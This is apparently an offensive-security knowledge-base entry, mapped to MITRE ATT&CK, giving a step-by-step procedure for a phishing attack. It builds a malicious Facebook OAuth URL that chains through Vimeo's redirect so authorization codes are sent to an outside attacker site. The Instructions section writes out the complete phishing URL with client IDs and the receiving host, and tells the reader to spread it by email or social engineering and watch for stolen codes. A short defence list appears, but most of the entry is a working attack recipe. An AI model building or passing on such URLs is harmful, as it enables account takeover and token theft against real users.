---
id: proc-craft-final-url
tags:
  - phishing
  - oauth-url
  - code-theft
type: procedure
tools: []
tactics:
  - '[[Credential Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Steal Application Access Token]]'
updated_at: '2025-12-14T17:31:11.117Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Credential Access]]'
mitre_techniques:
  - '[[Steal Application Access Token]]'
---
# Craft-Final-Malicious-OAuth-URL

## Summary

This procedure constructs the complete malicious OAuth URL for Facebook's dialog, embedding the chained Vimeo redirect to trick users into authorizing and sending codes to the attacker.

## Description

The final URL initiates Facebook's OAuth dialog with Vimeo's client_id and the chained redirect, requesting scopes like read_stream and publish_actions. When the user authorizes, the flow redirects through Vimeo to the attacker's site, exfiltrating the code for token exchange and account compromise.

## Requirements

1. Facebook app client_id (publicly known for Vimeo integration, e.g., 19884028963)
2. Chained Vimeo URI from previous step
3. URL encoding tools for safe parameter embedding

## Defense

Defensive measures and detection strategies:

- Validate nested redirects in OAuth requests
- Educate users on phishing links mimicking legit OAuth flows
- Monitor for anomalous authorization scopes in logs

## Objectives

1. Generate a clickable phishing URL
2. Intercept authorization code upon user interaction
3. Achieve unauthorized access to Facebook-Vimeo permissions

## Instructions

### Step 1: Base Facebook OAuth URL

**Context**: Start with Facebook's dialog endpoint and core params.

Use: `https://www.facebook.com/dialog/oauth?client_id=19884028963&redirect_uri=CHAINED_URI&scope=email,basic_info,read_stream,publish_actions`.

> CHAINED_URI is the URL-encoded version of the Vimeo authorize string.

### Step 2: URL Encode and Finalize

**Context**: Encode the chained URI and add display params.

Full URL: `https://www.facebook.com/dialog/oauth?client_id=19884028963&redirect_uri=https://api.vimeo.com/oauth/authorize%3Fresponse_type%3Dcode%26client_id%3D9f3bb9f9186bc825434330567c99283f6dd57586%26state%3D912145450290129%26redirect_uri%3Dhttp://www.prashanthvarma.in/code=&iframe=0&popup=0&player=0&product_id=0&scope=email,basic_info,read_stream,publish_actions`.

> Distribute via email or social engineering; monitor endpoint for code arrival.

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access]] Credential Access

### Techniques

- [[Steal Application Access Token]] Steal Application Access Token

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[Phishing]]
- [[oauth-url]]
- [[code-theft]]
